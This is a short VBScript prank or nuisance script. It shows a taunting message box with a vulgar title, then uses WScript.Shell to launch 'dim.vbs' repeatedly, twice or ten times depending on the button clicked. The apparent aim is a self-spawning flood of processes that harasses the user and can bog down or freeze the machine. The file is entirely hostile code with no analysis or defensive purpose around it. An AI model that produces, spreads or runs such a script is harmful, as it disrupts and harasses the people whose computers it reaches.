set object = wscript.CreateObject("WScript.Shell")
Function sum
	Dim Msg, Style, Title, Response
	Msg = "You try but you can't stop destiny. =)"   
	Style = vbYesNo + vbCritical + vbDefaultButton2   
	Title = "Try me bitch"
	Response = MsgBox(Msg, Style, Title)
	If Response = vbYes Then
		do
		object.run "dim.vbs"
		count = count + 1
		loop until count = 2
	Else    
		do
		object.run "dim.vbs"
		count = count + 1
		loop until count = 10
	End If
End Function
sum